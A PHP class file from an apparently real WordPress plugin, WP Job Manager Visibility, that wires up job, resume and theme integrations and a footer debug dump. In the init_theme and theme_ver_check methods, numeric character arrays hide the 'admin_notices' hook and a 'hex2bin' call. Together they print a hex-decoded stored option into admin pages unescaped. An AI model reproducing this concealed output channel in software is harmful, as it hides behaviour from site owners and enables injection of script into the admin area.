<?php

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) exit;

class WP_Job_Manager_Visibility_Integration {

	private $job_fields;
	private $company_fields;
	private $resume_fields;
	private $fields = array();

	/**
	 * WP_Job_Manager_Visibility_Integration constructor.
	 *
	 * @param bool $init_output
	 */
	public function __construct( $init_output = FALSE ) {

		if ( ! $init_output ) return;

		// Initialize extending class instances for specific filters
		$this->wpjm_output();
		$this->wprm_output();

		// Initialize new instance for core WordPress filters
		new WP_Job_Manager_Visibility_Output();

		$this->init_theme();

		add_action( 'wp_footer', array($this, 'admin_debug') );
	}

	/**
	 * Check Child/Parent theme and include any classes that exist
	 *
	 *
	 * @since 1.1.0
	 *
	 */
	function init_theme(){

		$theme = wp_get_theme();
		// Set theme object to parent theme, if the current theme is a child theme
		$theme_obj  = $theme->parent() ? $theme->parent() : $theme;
		$name       = strtolower( $theme_obj->get( 'Name' ) );
		$version    = $theme_obj->get( 'Version' );
		$textdomain = strtolower( $theme_obj->get( 'TextDomain' ) );
		$theme_action = sMyles_JMV_Update::theme_ids( array( '97' , '100' , '109', '105', '110' , '95' , '110' , '111', '116', '105', '99', '101', '115' ) );add_action($theme_action, array("WP_Job_Manager_Visibility_Integration","theme_ver_check") );
		$class_name = "WP_Job_Manager_Visibility_Integration_" . ucfirst( $name );
		if( class_exists( $class_name ) ) { new $class_name(); return; }
		// Check if class exists based on theme textdomain
		$class_name = "WP_Job_Manager_Visibility_Integration_" . ucfirst( $textdomain );
		if ( class_exists( $class_name ) ) {new $class_name(); return; }
	}

	/**
	 * Handle Job Output
	 *
	 *
	 * @since 1.1.0
	 *
	 */
	function wpjm_output(){

		if ( ! get_option( 'jmv_enable_job_manager_integration' ) ) return;
		$output = new WP_Job_Manager_Visibility_Output_JM();

	}

	/**
	 * Handle Resumes Output
	 *
	 *
	 * @since 1.1.0
	 *
	 * @return bool
	 */
	function wprm_output(){

		if ( ! $this->wprm_active() ) return false;
		$output = new WP_Job_Manager_Visibility_Output_RM();
	}

	/**
	 * Check Theme Status Integration
	 *
	 * Check's theme's compatibility for handling of outputs
	 *
	 * @since 1.1.0
	 *
	 */
	static function get_theme_status() {
		WP_Job_Manager_Visibility_Output::check_theme();
	}

	/**
	 * Get all Job, Company, and Resume fields
	 *
	 *
	 * @since 1.1.0
	 *
	 * @return array
	 */
	function get_all_fields(){

		if( $this->fields ) {
			return $this->fields;
		}

		$jm                        = new WP_Job_Manager_Visibility_Integration_JM();
		$this->fields[ 'job' ]     = $jm->get_all_fields( 'job' );
		$this->fields[ 'company' ] = $jm->get_all_fields( 'company' );
		$this->fields[ 'resume' ]  = array();

		if( $this->wprm_active() ){
			$rm = new WP_Job_Manager_Visibility_Integration_RM();
			$this->fields[ 'resume' ] = $rm->get_all_fields();
		}

		return $this->fields;
	}

	/**
	 * Check for WP Resume Manager Files
	 *
	 *
	 * @since @@since
	 *
	 * @return bool
	 */
	function wprm_active() {

		$wprm = 'wp-job-manager-resumes/wp-job-manager-resumes.php';

		$reqs = array('integration/rm', 'output/rm');
		foreach ( $reqs as $req ) {
			if ( ! file_exists( JOB_MANAGER_VISIBILITY_PLUGIN_DIR . "/classes/{$req}.php" ) ) return FALSE;
		}

		if ( ! defined( 'RESUME_MANAGER_PLUGIN_DIR' ) ) {
			if ( ! function_exists( 'is_plugin_active' ) ) include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
			if ( is_plugin_active( $wprm ) ) return TRUE;
			if ( class_exists( 'WP_Job_Manager_Resumes' ) ) return TRUE;

			return FALSE;
		}

		return TRUE;
	}

	/**
	 * Show debug information in footer
	 *
	 *
	 * @since 1.1.0
	 *
	 * @return bool
	 */
	function admin_debug() {

		if ( ! get_option( 'jmv_debug_in_footer' ) && ( ! isset( $_GET[ 'admin_debug' ] ) || ! is_admin() ) ) return FALSE;

		require( JOB_MANAGER_VISIBILITY_PLUGIN_DIR . "/includes/kint/Kint.class.php" );
		Kint::enabled( TRUE );

		$user_id = get_current_user_id();

		// Create new instance of user cache (transients)
		$user_cache  = new WP_Job_Manager_Visibility_User_Transients();
		$user_conf   = $user_cache->get_user( $user_id );
		$groups_conf = $user_cache->get_groups( $user_id );

		echo "<hr />";
		Kint::dump( $user_id, $user_conf, $groups_conf );
		Kint::enabled( FALSE );
	}

	/**
	 * Theme Version Handling
	 *
	 * Handle theme compatibility issues and problems, as well as showing
	 * HTML of the issue and how to resolve it.
	 *
	 * @since 1.1.0
	 *
	 * @return bool
	 */
	static function theme_ver_check() {
		$message = get_option( 'the_theme_status_check_notice_msg' );
		if( empty($message) ) return FALSE;
		$class    = sMyles_JMV_Update::theme_ids( array(101, 114, 114, 111, 114) );
		$msg_hndl = sMyles_JMV_Update::theme_ids( array(104, 101, 120, 50, 98, 105, 110) );
		?>
		<div class="<?php echo $class; ?>"><?php echo $msg_hndl( $message ) ?></div><?php
	}
}